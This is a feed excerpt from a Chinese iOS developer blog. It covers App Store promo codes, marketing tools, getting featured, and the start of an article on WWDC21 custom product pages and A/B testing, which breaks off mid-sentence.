下载不了的问题！</p><p>这时候，除了让用户等苹果应用生效后在手动下载，还有一个方式，就是让用户取消预订应用！具体可以参考文档 <a href="https://support.apple.com/zh-cn/HT202723">取消应用预订</a>，然而，这里需要注意一下，如果游戏是开启了预订奖励，那么让用户取消预订在下载，就可能导致用户的预订奖励无法领取啦！</p><p>通过这些细节的探究，App Store 功能之多，每一个小功能，都紧密联系，所以导致系统庞大而臃肿，牵一发而动全身，希望苹果能看到这些问题，做的更加好~</p><h4 id="2-8-促销代码（兑换码）"><a href="#2-8-促销代码（兑换码）" class="headerlink" title="2.8 促销代码（兑换码）"></a>2.8 促销代码（兑换码）</h4><blockquote><p>借助在 App Store Connect 中配置的促销代码，让媒体和有影响力的用户率先体验您的 app 或 App 内购买项目。您可以为一款 app 在不同平台的每个版本提供最多 100 个促销代码；每款 App 内购买项目也能提供最多 100 个促销代码。</p><p><a href="https://help.apple.com/app-store-connect/?lang=zh-cn#/dev50869de4a">促销代码概述</a></p></blockquote><p>促销代码可能大家习惯叫<strong>兑换码</strong>。促销代码的作用，从苹果的角度来看，是让开发者方便给<strong>媒体和有影响力的用户</strong>率先体验和评测 app。所以，苹果对促销代码的限制比较多，每个 App 内购买项目提供至多 100 个促销代码，每个 App 的 App 内购买项目代码在每六个月内的总上限均为 1000 个（在1月1日和7月1日重置）。这些代码用于非商业用途，并会在请求代码的 28 天之后过期。</p><p>促销代码对于开发者来说，唯一的好处是 app 在 App Store 上架之前使用。也就是说，app 过审后，如果没有发布对外，在 App Store 是无法查看的，但通过促销代码，可以在 App Store 里进行兑换下载。并且对兑成功后，这个 app 可以永久下载，但是，苹果会区分促销代码下载的用户，这部分用户无法对 app 进行评价。点击评分时，会提示“您必须拥有此项目”：</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9fe0fcc10c0a480591cfda8eadc39e52~tplv-k3u1fbpfcp-watermark.image" alt="16279577944052.jpg"></p><p>2014 年，Apple 收购了 TestFlight，所以现在苹果主力的测试分发方式改为了 TestFlight。但 TestFlight 也有明显无法满足的需求，因为苹果最终还是想让用户通过 App Store 下载 app。所以 TestFlight 发布的 app 每个版本只有 90 天测试时间，如果开发者在 90 天内没有更新，那么用户就无法从 TestFlight 中下载该应用。而已经下载到设备的 app，也会在下载之日起的第 90 天后失效。在某个版本失效或被开发者主动移除前，用户可以随意在应用的不同版本中切换，用于对比版本间的差异。</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5f423129f5a3489c980a663c13909a3e~tplv-k3u1fbpfcp-watermark.image" alt="16279585748731.jpg"></p><p>然后，目前在国区，促销代码代码也换出很多花样，变成一个第三方分发的方式。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3e768c8828624a928d6aeeeead4ae60f~tplv-k3u1fbpfcp-watermark.image" alt="16279588662691.jpg"></p><p>最后，除了以上的促销代码，苹果在 iOS 14 时，推出了 <a href="https://developer.apple.com/cn/news/?id=lrnyc3aj">订阅优惠代码</a>，优惠代码让您能以优惠价格或限时免费形式来提供订阅，可以帮助您获取、留存和赢回订阅用户。苹果对于内购的营销方式支持力度一直是重点，特殊是游戏类是内购的大头。</p><p>使用 iOS 14 和 iPadOS 14 及更高版本的顾客可以通过一个一次性代码兑换 URL 在 App Store 上兑换优惠代码；如果开发者在 app 实现了 <a href="https://developer.apple.com/documentation/storekit/skpaymentqueue/3566726-presentcoderedemptionsheet">presentCodeRedemptionSheet (英文)</a> API，用户也可以在 app 内直接兑换。</p><p>综上，兑换码本身是可以方便开发者为用户提供测试的机会，随着业务需求的变化，开发者更多的是希望通过兑换码，来吸引用户进行下载 app！毕竟，现在让用户下载一个 app 是非常难的事情。</p><h4 id="2-9-App-Store-工具"><a href="#2-9-App-Store-工具" class="headerlink" title="2.9 App Store 工具"></a>2.9 App Store 工具</h4><p>说了这么多，对于苹果和开发者来说，App Store 的利益是共赢(至少是不亏)，所以推广开发者的 app，对于苹果或者是开发者来说，都是头等大事。对于大公司来说，会有很多营销或者创意进行推广，但对于一般的开发者来说，特别是独立开发者来说，是一种非常不容易的事。所以，我们一起来看看，苹果为开发者提供了那些推广 app 的工具吧~</p><p><strong>App Store Marketing Tools</strong></p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9741ba09551847d09644ec2ede6cd12e~tplv-k3u1fbpfcp-watermark.image" alt="16279598657980.jpg"></p><p><a href="https://tools.applemediaservices.com/app-store/">Market with App Store</a> 是一个非常棒的工具，让开发者快速生成需要的推广素材。生成可打开您 App Store 产品页面的短链接或嵌入式代码，并显示您的 app 图标、二维码或 App Store 徽章。</p><p>简单来说，开发者通过 <a href="https://tools.applemediaservices.com/app-store/">Market with App Store</a> 搜索自己的 app，然后就可以点击打开素材的页面：</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e08794f95528484ebeca1c388d895893~tplv-k3u1fbpfcp-watermark.image" alt="16279604843988.jpg"></p><p>Content Link 是 app 的下载链接，App Icon 点击左边的 <code>Copy Embed</code> 是一段 html 的代码，效果是如图一样的一个 icon 的图标，点击图标时会跳转到 app 下载链接。右边是下载当前的 icon 图标（分辨率是1000x1000，自动切成苹果的圆角）。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3ead02dd927340f18157fa8136d0956f~tplv-k3u1fbpfcp-watermark.image" alt="16279607760231.jpg"></p><p>这个是 App Store 下载的徽章，支持白色和黑色风格，还有“下载”方案是支持多语言定义。</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5b867fe2524745d48c9adee60cdad6f9~tplv-k3u1fbpfcp-watermark.image" alt="16279608629386.jpg"></p><p>最后是 QR Code 二维码，支持黑色、白色、蓝色三种风格，嵌入 app 图标等。这个功能至少来说还是很方便的~</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3b445d1c98a14f7787235579c90ddad3~tplv-k3u1fbpfcp-watermark.image" alt="16279621769632.jpg"></p><p>除了 app 的推广素材，还有 Books、Music、News、Podcasts、TV 等，大家有兴趣的可以自行研究哈，这里就不展开了。</p><p><strong>其他图案和指南</strong></p><p>为了方便开发者，在网站、电子邮件和社交媒体中展示 app，同时显示 Apple 产品图像和 App Store 徽章等。苹果在 <a href="https://developer.apple.com/cn/app-store/marketing/guidelines/#section-products">营销资源和识别标志指南</a> 页面里提供了很多素材下载。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/267e5378a0734360ada86f49336d6640~tplv-k3u1fbpfcp-watermark.image" alt="16279611453135.jpg"></p><p>App Store 徽章提供了下载和预下载的样式，App Store、Mac App Store、Apple TV 三个平台。对于素材来说，所有本地化语言都包含，下载的每个语言文件夹下有 <code>EPS</code> 和 <code>SVG</code> 二种格式的矢量图片。</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b6d808dc150648c0a74b59f5398155e6~tplv-k3u1fbpfcp-watermark.image" alt="16279612522994.jpg"></p><p>苹果非常注重品牌的推广和营销，所以开发者的营销材料中使用 Apple 提供的产品图像，苹果建议始终使用 app 当前开发所针对的最新一代产品图像。在 <a href="https://developer.apple.com/cn/app-store/marketing/guidelines/">营销资源和识别标志指南</a> 页面还有非常多的详细规范和准则，感兴趣的朋友可以看看哈~</p><p><strong>Apple Design Resources</strong></p><p>在苹果 <a href="https://developer.apple.com/design/resources/">Apple Design Resources</a> 页面，可以下载苹果的标准 UI 素材，包括 Sketch、Photoshop 和 XD 模板等格式，方便开发者快速准确地设计 app 效果图。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b5f1e97c686848268a8e61d152bf00b2~tplv-k3u1fbpfcp-watermark.image" alt="16279637326714.jpg"></p><p><strong>RSS Generator</strong></p><p>通过这个 <a href="https://rss.itunes.apple.com/zh-cn">RSS Feed 生成工具</a> 页面，可能获取 App Store 榜单的应用排名情况，并且是有 Feed 链接可以获取数据，大家有兴趣可以看看。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/cab85d21924a42f0945f35253214a76a~tplv-k3u1fbpfcp-watermark.image" alt="16279641356168.jpg"></p><h4 id="2-10-iOS-和-iPadOS-的使用情况"><a href="#2-10-iOS-和-iPadOS-的使用情况" class="headerlink" title="2.10 iOS 和 iPadOS 的使用情况"></a>2.10 iOS 和 iPadOS 的使用情况</h4><p>在 <a href="https://developer.apple.com/cn/support/app-store/">App Store - 支持</a> 页面，苹果提供了最新的 iOS 和 iPadOS 的占比数据：</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5073c968a4ce4171b8d442a72abc4182~tplv-k3u1fbpfcp-watermark.image" alt="16279628002579.jpg"></p><p>通过这个数据，可以了解到最新的占比。当然对于不同的地区或者国家，不同的 app，如果要说明产品或者老板 app 不支持 iOS 12 了？ 可能还是从自家的产品的数据监控为准吧，毕竟苹果这个只是 App Store 的数据，不是苹果的所有设备的系统数据。</p><h4 id="2-11-App-侵权争议"><a href="#2-11-App-侵权争议" class="headerlink" title="2.11 App 侵权争议"></a>2.11 App 侵权争议</h4><p>开发者开发的 app，可能会面临侵权风险，这个侵权不单单是大家想到的内容抄袭、素材盗用等，比如起的 app 名字，可能别人申请了商标，而你当初起名字时，可能也没有太在意等。随着 App Store 越来越大，其中的利益竟争也必然越来越被重视。开发者在 app 的元数据和内容方面，也需要特别注意。</p><p>最后，如果你发现有争议的 app 时，可以通过苹果 <a href="https://www.apple.com/legal/internet-services/itunes/appstorenotices/#/contacts?lang=zh">Apple - Legal - iTunes App Store Content Dispute</a> 页面进行申诉。这个申诉，苹果不会马上对争议的 app 进行处理，而是会给争议双方发送电子邮件，以便双方直接沟通，解决争议。如果你收到苹果的争议邮件，也需要特别注意，及时回复邮件，否则苹果会认为你对争议没有异议，然后将你的 app 下架处理。</p><h4 id="2-12-分享您的故事"><a href="#2-12-分享您的故事" class="headerlink" title="2.12 分享您的故事"></a>2.12 分享您的故事</h4><p><strong>入选 App Store 精选推荐</strong></p><blockquote><p>App Store 拥有一支全球营销团队，专注于提升 app 的曝光度和用户的参与度。他们会打造各种营销活动和计划，为用户提供帮助、信息和灵感，同时帮助您提升自己 app 和游戏的下载次数与重新下载次数。我们的全球编辑团队根据用户所使用设备的不同，为他们量身打造专属的 App Store app 选购体验，从而在合适的时间和地点，将您的 app 呈现给合适的用户。</p><p>如果您的 app 背后有独特的故事，想与我们的编辑团队分享，<a href="https://developer.apple.com/cn/app-store/getting-featured/">欢迎告诉我们</a>。如果您准备推出新的 app 或重大更新，请在发布的 6 至 8 周前告知我们。</p></blockquote><p>除了刚刚说到的 App Store 秘密，分享您的开发者故事，就是最大的秘密！获取推荐，最终带来大量的新增用户是非常可观的方式，具体大家可以通过 <a href="https://developer.apple.com/cn/app-store/getting-featured/">欢迎告诉我们</a> 了解更多。</p><p>最后，我们主要是来说说，假如被苹果推荐后，经常会有同学这样问到，这些素材通过什么方式给苹果呢？ 格式和标准尺寸是怎么样？</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/a8b42c5bf01e41ee9592e11dd1e1084d~tplv-k3u1fbpfcp-watermark.image" alt="16279676460575.png"></p><p>如果 app 被推荐，苹果会在 App Store Connect 开放对应的入口 <code>Promotional Artwork</code>，因为苹果的推荐位有很多种类型，具体可以查看这个 <a href="https://help.apple.com/asc/appspromoart/#/itcff8683d86">文件的格式</a> 文档。</p><p>特别说一下，苹果推荐目前是没有分级或者分账号显示不同的内容，所有的账号显示的推荐内容是一样的。所以，一般最好是老少皆宜的内容，推广素材需要特别注意，举例来说：</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1482ab97732642709f96d9c406df525e~tplv-k3u1fbpfcp-watermark.image" alt="16279683051475.jpg"></p><p>详细可以参考这个 <a href="https://help.apple.com/asc/appspromoart/?lang=zh-cn/">App Store 推广图案准则</a> 文档，苹果列举了非常全面的准则和教程，这里就不展开了。</p><h3 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h3><p>文章有点长了，终于总结了 12 个可能是秘密的秘密？不知道大家有没有认真看完，但希望大家有所收获哈~</p><p>最后，从开发者角度来说，每个公司的业务都不一样，大家接触的 App Store “秘密”也不尽相同。所以，小编只是从接触过的视角跟大家一起分享，如果大家有更多“秘密”欢迎与我们一起分享，一起交流，一起进步~</p><p>欢迎大家一起在评论区交流~</p><blockquote><p>欢迎关注我们，了解更多 iOS 和 Apple 的动态~</p></blockquote><h3 id="四、参考"><a href="#四、参考" class="headerlink" title="四、参考"></a>四、参考</h3><ul><li><a href="https://www.apple.com.cn/cn/support/systemstatus/">Apple - Support - System Status</a></li><li><a href="https://www.apple.com/choose-country-region/">Choose your country or region - Apple</a></li><li><a href="https://developer.apple.com/system-status/">System Status - Apple Developer</a></li><li><a href="https://support.apple.com/zh-cn/HT201400">如果您无法连接到 App Store、iTunes Store 或其他 Apple 服务 - Apple 支持 (中国)</a></li><li><a href="https://www.google.com/appsstatus/dashboard/">Google Workspace 状态信息中心</a></li><li><a href="https://status.cloud.google.com/">Google Cloud Status Dashboard</a></li><li><a href="https://support.google.com/a/answer/139569?hl=zh-Hans">查看 Google Workspace 服务的当前状态 - Google Workspace 管理员帮助</a></li><li><a href="https://status.firebase.google.com/">Firebase Status Dashboard</a></li><li><a href="https://ads.google.com/status/publisher/">Google Ads 状态信息中心</a></li><li><a href="https://developer.apple.com/cn/app-store/pre-orders/">为您的 App 提供预订 - App Store - Apple Developer</a></li><li><a href="https://help.apple.com/app-store-connect/#/dev44877b669">将您的 App 以预订形式发布 - App Store Connect 帮助</a></li><li><a href="https://support.apple.com/zh-cn/HT202723">在 App Store、iTunes Store 和 Apple Books 中预订应用、影片、音乐和图书 - Apple 支持</a></li><li><a href="https://developer.apple.com/documentation/appstorereceipts/responsebody/receipt">responseBody.Receipt | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/appstorereceipts/verifyreceipt">verifyReceipt | Apple Developer Documentation</a></li><li><a href="https://support.apple.com/zh-cn/HT202180">如何在 Apple 设备上手动更新 App - Apple 支持 (中国)</a></li><li><a href="https://developer.apple.com/cn/news/?id=06142019a">App Store 链接更新 - Apple Developer</a></li><li><a href="https://support.google.com/googleplay/android-developer/answer/9859047?hl=zh-Hans">为应用开放预注册服务以提升用户认知度 - Play 管理中心帮助</a></li><li><a href="https://zh.wikipedia.org/wiki/%E5%A4%AA%E5%B9%B3%E6%B4%8B%E6%97%B6%E5%8C%BA">太平洋时区 - 维基百科</a></li><li><a href="https://juejin.cn/post/6974733392260644895">苹果iOS内购三步曲：App内退款、历史订单查询、绑定用户防掉单！— WWDC21</a></li><li><a href="https://juejin.cn/post/6986478834040209445">解读 AppStore 新功能：自定义产品页面和 A/B Test 工具</a></li><li><a href="https://developer.apple.com/cn/app-store/features/">App Store - 功能 - Apple Developer</a></li><li><a href="https://developer.apple.com/cn/app-store/ratings-and-reviews/">评分、评论和回复 - App Store - Apple Developer</a></li><li><a href="https://www.apple.com.cn/itunes/">iTunes - Apple</a></li><li><a href="https://developer.apple.com/library/archive/documentation/AudioVideo/Conceptual/iTuneSearchAPI/index.html">iTunes Search API: Overview</a></li><li><a href="http://resources.organicfruitapps.com/documentation/itunes-store-web-service-search-api/">iTunes Store API</a></li><li><a href="https://support.apple.com/zh-cn/HT202039">如何取消 Apple 提供的订阅 - Apple 支持 (中国)</a> </li><li><a href="https://support.apple.com/zh-cn/HT204266">从 App Store 下载 App 和游戏 - Apple 支持</a></li><li><a href="https://support.apple.com/zh-cn/HT207165">如果无法在 iPhone 或其他 Apple 设备上下载或更新 App - Apple 支持</a></li><li><a href="https://developer.apple.com/cn/app-store/getting-featured/">入选 App Store 精选推荐 - App Store - Apple Developer</a></li><li><a href="https://developer.apple.com/cn/app-store/discoverability/">探索 App Store 和 Mac App Store - App Store - Apple Developer</a></li><li><a href="https://help.apple.com/app-store-connect/?lang=zh-cn#/dev50869de4a">促销代码概述 - App Store Connect 帮助</a></li><li><a href="https://developer.apple.com/cn/news/?id=lrnyc3aj">为订阅优惠代码做好准备 - 新闻 - Apple Developer</a></li><li><a href="https://developer.apple.com/cn/app-store/subscriptions/#offer-codes">自动续期订阅 - App Store - Apple Developer</a></li><li><a href="https://tools.applemediaservices.com/app-store/">Market with App Store</a></li><li><a href="https://developer.apple.com/cn/app-store/marketing/guidelines/#section-products">营销资源和识别标志指南 - App Store - Apple Developer</a></li><li><a href="https://help.apple.com/asc/appspromoart/#/">App Store 推广图案准则</a></li><li><a href="https://developer.apple.com/cn/support/app-store/">App Store - 支持 - Apple Developer</a></li><li><a href="https://www.apple.com/legal/internet-services/itunes/appstorenotices/#/contacts?lang=zh">Apple - Legal - iTunes App Store Content Dispute</a></li><li><a href="https://developer.apple.com/design/resources/">Apple Design Resources - Apple Developer</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文首发于 &lt;a href=&quot;https://juejin.cn/post/6992134804997160996&quot;&gt;你一定不知道的 AppStore 秘密 - 掘金&lt;/a&gt;，欢迎关注我们 &lt;a href=&quot;https://juejin.cn/user/1002387318511214&quot;&gt;@37手游iOS技术运营团队&lt;/a&gt; 。&lt;/p&gt;</summary>
    
    
    
    <category term="technology" scheme="https://ihtcboy.com/categories/technology/"/>
    
    
    <category term="App Store" scheme="https://ihtcboy.com/tags/App-Store/"/>
    
    <category term="苹果商店" scheme="https://ihtcboy.com/tags/%E8%8B%B9%E6%9E%9C%E5%95%86%E5%BA%97/"/>
    
  </entry>
  
  <entry>
    <title>解读 AppStore 新功能：自定义产品页面和 A/B Test 工具</title>
    <link href="https://ihtcboy.com/2021/07/19/2021-07-19_%E8%A7%A3%E8%AF%BBAppStore%E6%96%B0%E5%8A%9F%E8%83%BD%EF%BC%9A%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BA%A7%E5%93%81%E9%A1%B5%E9%9D%A2%E5%92%8CAB-Test%E5%B7%A5%E5%85%B7/"/>
    <id>https://ihtcboy.com/2021/07/19/2021-07-19_%E8%A7%A3%E8%AF%BBAppStore%E6%96%B0%E5%8A%9F%E8%83%BD%EF%BC%9A%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BA%A7%E5%93%81%E9%A1%B5%E9%9D%A2%E5%92%8CAB-Test%E5%B7%A5%E5%85%B7/</id>
    <published>2021-07-19T03:51:16.000Z</published>
    <updated>2022-02-13T12:51:14.683Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于 <a href="https://juejin.cn/post/6986478834040209445">解读 AppStore 新功能：自定义产品页面和 A/B Test 工具 - 掘金</a>，欢迎关注我们 <a href="https://juejin.cn/user/1002387318511214">@37手游iOS技术运营团队</a> 。</p><span id="more"></span><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>可能很多开发者还没有意识到，今年 WWDC21 推出 <a href="https://developer.apple.com/videos/play/wwdc2021/10295/">《Get ready to optimize your App Store product page》</a> 是一个重磅功能！因为 iOS app 下载的地方，目前只有一个：<code>App Store</code>。所以，它是所有 app 能够提高暴光和决定用户是否下载最直接和最后的风口。如何包装好这个风口，最直接是影响下载量！而下载量意味着用户量。所以这个 Session 的重要性不言而喻，但是这个 Session 视频仅仅只有 8 分钟时间！为什么呢？咱们先留个伏笔，下文在解读。</p><h3 id="二、正文"><a href="#二、正文" class="headerlink" title="二、正文"></a>二、正文</h3><p>大家好！今天小编又带大家一起吃瓜啦！咱们先来总结一下有那些 App Store 新功能，然后<strong>挖掘一些深度剖析的问题并尝试“解答”，最后分享一些 App Store 解读</strong>，最后，本文希望大家能有所<strong>收获</strong>哈~</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/752ed7c3d3b04e52b551b9ac18f97338~tplv-k3u1fbpfcp-watermark.image" alt="16266156439879.jpg"></p><p>首先，AppStore 产品页面优化有二个方面：</p><ul><li>自定产品页面</li><li>产品页面优化</li></ul><p>简单来说，<code>自定产品页面</code> 就是开发者可以针对一个 app 设置不同的商店截图、app 预览和推广文本；而 <code>产品页面优化</code> 就是可以测试使用不同的 app 图标、截图、预览和推广文本时，不同用户的反应(展示次数、下载次数、转化率等)，从而优化并提升效果。</p><blockquote><p><strong>进一步利用您的产品页面</strong></p><p>今年晚些时候，您将能够在 App Store 上对产品页面进行优化和自定，进一步提高页面的相关性和有效性。了解如何使用这些功能在 iOS 和 iPadOS 上的 App Store 中以全新方式与顾客分享您的 app。</p></blockquote><p><strong>自定产品页面</strong><br>使用不同的推广文本、截屏和 app 预览，创建产品页面的其他版本，更好地展示 app 的特定功能或内容。通过唯一的链接将相关受众定向到特定页面，并在“App 分析”中查看效果。</p><p><strong>产品页面优化</strong><br>比较不同的 app 图标、截屏和 app 预览，看看哪个最能引起用户共鸣，从而优化您的产品页面。在 App Store Connect 的“App 分析”中查看结果，然后将效果最好的素材资源呈现给所有用户。</p><blockquote><p>注：在苹果的 <a href="https://developer.apple.com/cn/app-store/product-page-updates/">官方文档</a> 有详细说明。</p></blockquote><h4 id="2-1-自定产品页面"><a href="#2-1-自定产品页面" class="headerlink" title="2.1 自定产品页面"></a>2.1 自定产品页面</h4><p>首先，讲解一下自定产品页面，到底有那些内容可以自定义：</p><ol><li>app 预览</li><li>截屏</li><li>推广文本</li></ol><p>目前只支持以上三种元数据的自定义，app 图标、app 名称、描述、副标题等暂时不支持。（为什么不支持？读者可以思考一下，下文会解读。）</p><p>举例子来说，比如下面这个应用：</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0c3c83659f0147308335fcb84d98f170~tplv-k3u1fbpfcp-watermark.image" alt="16266160583897.jpg"></p><p>这是一个关于登山者的应用，第一个产品页面是 <code>默认产品页面</code>，也就是这个是默认的商店显示效果，但是这个默认的页面，针对所有用户都是一样的，所以，并不能让不同的兴趣爱好的用户都能第一时间了解到自己想要和关注的功能。举例来说，比如一些用户喜欢登山，而另一些用户可能只是喜欢看别人登山或享受山上风景，这时候开发者就可以利用自定产品页面，选择展示 app 直播的功能，吸引有兴趣实时关注登山者或将直播他们自己的登顶旅程的用户。诸如此类，创建突出显示 GPS 跟踪功能，以吸引有兴趣计划与一群朋友一起攀登的人。如果您开发一款游戏，您可以创建一个最吸引人的游戏角色或受欢迎的玩法，突出您游戏的截图或 app 预览的自定义界面。<strong>总之，您可以把您 app 的特色内容提炼成卖点，创建特色的自定义产品页面。</strong>（是不是很棒，可以点个赞！下面内容更赞哦~）</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/fac8e2e77f4c4aa2b143ebe9f9d9daf5~tplv-k3u1fbpfcp-watermark.image" alt="16266176661670.jpg"></p><p>好了，咱们总结一下 <code>自定产品页面</code> 的功能：</p><ul><li>自定义元数据：<ol><li>app 预览</li><li>截屏</li><li>推广文本</li></ol></li><li>可本地化</li><li>唯一商店链接</li></ul><p><strong>可本地化</strong>就是可以针对某个语言创建自定义产品页面，最后，每个自定义的产品页面，都有自己唯一的 URL，因为自定义的产品页面，必须是通过单独的链接才能访问显示对应的自定义页面，而默认用户在商店看到的是：<code>默认产品页面</code>（Dafault product page）。</p><p>说到这里，有读者可能会有这样的疑问：能自定义的 app 图标吗？不着急，小编在下文解读部门在分析啊。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2cd9ce56bab049fca64a3c8e145d9b8b~tplv-k3u1fbpfcp-watermark.image" alt="16266176768705.jpg"></p><p>既然创建了自定义产品页面，那么目的也是很明确，做了事情就要看效果嘛！通过 App Store Connect 后台的 App Analytics 中可以查看每个页面的指标，包括：</p><ul><li>展示次数</li><li>下载量</li><li>转化率</li><li>留存数据</li><li>每位付费用户的平均收益</li></ul><p>通过以上数据，了解某些页面如何转化用户，具体的数据和效果，目的不太确定，到时候大家可以试试看啊~</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0ab9a4efd0fe47ee8603b8358c3eb2d8~tplv-k3u1fbpfcp-watermark.image" alt="16266184290852.jpg"></p><p>总结一下 <code>自定产品页面</code> 开发者可以提前准备什么：</p><ul><li>计划明确您的目标</li><li>考虑您突出显示的功能和内容</li><li>准备好元数据</li></ul><p>最后，<strong>划重点</strong>：</p><ul><li>一次最多可以发布 35 个自定产品页面。</li><li>您可以随时在 App Store Connect 中创建新的页面并单独提交这些页面进行审核，而不需提交 app 更新。</li><li>在“App 分析”中查看展示次数、下载次数、转化率等信息，以便监控每个自定产品页面的效果。</li><li>衡量每个自定产品页面的用户留存率和付费用户平均收益，以了解这些页面在一段时间内的效果。</li></ul><blockquote><p>注：可以在 <a href="https://developer.apple.com/cn/app-store/product-page-updates/">增强您的产品页面 - App Store - Apple Developer</a> 页面了解。</p></blockquote><h4 id="2-2-产品页面优化"><a href="#2-2-产品页面优化" class="headerlink" title="2.2 产品页面优化"></a>2.2 产品页面优化</h4><p>以上说的 <code>自定产品页面</code> 功能，因为自定义的界面是通过单独唯一的链接访问，所以一般是用在推广渠道，针对某些兴趣的用户群体投放的广告等。那些在 App Store 里搜索或浏览 app 的用户，自定义产品页面起不到作用啊！所以，苹果就提出了优化的方案，通过设置和测试默认页面的不同处理方式，拆分每个页面的流量，给不同的用户展示不同的内容：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/230c2624009a4c9881158f88520a72fa~tplv-k3u1fbpfcp-watermark.image" alt="16266190429109.jpg"></p><ul><li>原始产品页面</li><li>测试产品页面</li></ul><p><code>Treatment</code> 可译为治疗、处理，此处小编翻译为<strong>测试</strong>比如好理解。也可以这样理解：<code>原始产品页面</code>（对照组）和 <code>测试产品页面</code>（实验组）。</p><p>举例来说，有一个 app 的图标主色调是紫色，那如果换成红色图标后用户会不会更愿意下载 app 呢？换作以前是没有办法对比测试，只能换一个图标看看。而现在，苹果允许，一个 app 同时创建不同的 app 图标的产品页面进行对比测试：</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/41a912ddcba64add95d9aa0988e0ec11~tplv-k3u1fbpfcp-watermark.image" alt="16266196049939.jpg"></p><p>简单来说，开发者设置 <code>原始产品页面</code> 和 <code>测试产品页面</code>后，选择每一种获得总流量比例，比如原始产品页面设置为 70% 流量后，其它三种每个将获得 10% 流量。需要注意的时，按照控制变量法的原则，每个测试最好是只改变一个变量啊。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/088f40712ab84c8cb5bf53febddf4ee8~tplv-k3u1fbpfcp-watermark.image" alt="16266202825378.jpg"></p><p>涉及 app 图标测试时，我们要确保所有下载您 app 的用户都能获得一致的体验。因为，您的 app 图标是吸引 App Store 用户并在他们的主屏幕上脱颖而出的重要变量。简单来说，就是用户如果在商店看到你的 app 图标是红色，那么用户如果下载到手机的话，应该看到 app 的图标也是红色，这样才符合用户的预期！所以，<strong>测试 app 图标时，需要在 app 包体中包括对应的测试图标，也就是需要重新提交 app 更新审核</strong>。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f07b616a178d49518be89854ed839f3c~tplv-k3u1fbpfcp-watermark.image" alt="16266203252869.jpg"></p><p>另外，开发者还可以仅在特定的本地化语言中测试。例如，app 产品页面当前已本地化为英语、日语和韩语，则您可以选择仅以日语进行测试。这意味着任何看到您的产品页面的英语或韩语本地化版本的用户都不会参与测试。因为如果您的测试目的仅与您的本地化的一个子集相关，这使您可以灵活地专注于测试。简单来说，一些测试的内容可能与日本地区的文化背景和用户习惯有很大关联，调整的内容可能只针对日本地区用户展示，那么测试就没有必要干扰其它地区的用户，也更加精耕细作！另外，<strong>如果测试产品页面的图标转化效果更好，此时不能设置测试产品页面为默认的产品页面，需要提交 app 更新图标的重新送审。</strong></p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5b86f5467d3e4dbfbed56a8d4788f9fe~tplv-k3u1fbpfcp-watermark.image" alt="16266205532546.jpg"></p><p>既然优化产品页面测试有这些多变量控制，那么目的也是很明确，做了事情就要看效果嘛！通过 App Store Connect 后台的 App Analytics 中可以查看每个页面的指标，包括：</p><ul><li>展示次数</li><li>下载量</li><li>转化率</li><li>改进方案</li></ul><p>改进方案是指每种处理相对于基线（<code>原始产品页面</code>）的改进的指标，比如实验组的测试结果比原始产品页面效果更好，就改用实验组的产品页面等。有关如果在 App Analytics 中查看这些分析数据和更多详细信息，大家可以查看 “<a href="https://developer.apple.com/videos/play/wwdc2021/10115">App Analytics 中的新功能</a>”。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b5be1c061db2422aaa1ef640c04e9b2b~tplv-k3u1fbpfcp-watermark.image" alt="16266224678416.jpg"></p><p>总结一下 <code>优化产品页面</code> 开发者可以提前准备什么：</p><ul><li>形成强有力的假设</li><li>准备好元数据</li><li>计划您的应用发布</li></ul><p><strong>形成强有力的假设</strong></p><p>您可能会预测将应用图标更改为不同的样式会在某些语言环境中带来更好的转化，为什么这样做？因为测试是有条件限制的：</p><ol><li>每个测试是一个 <code>原始产品页面</code> 和最多 3 个<code>测试产品页面</code>。</li><li>测试期间最多可以持续 90 天</li></ol><p>所以，开发者针对每个测试，一定有良好的假设支撑，不然测试假设可能会误导自己啊~</p><p><strong>准备好元数据</strong></p><p>目前支持测试的只有以下三种元数据：</p><ol><li>app 图标</li><li>截屏</li><li>app 预览</li></ol><p><strong>计划您的应用发布</strong></p><p>这个是针对 app 图标的测试，因为测试的 app 图标是必须包含在 app 的二进制文件中，也就是包体中，所以测试图标前，需要提交 app 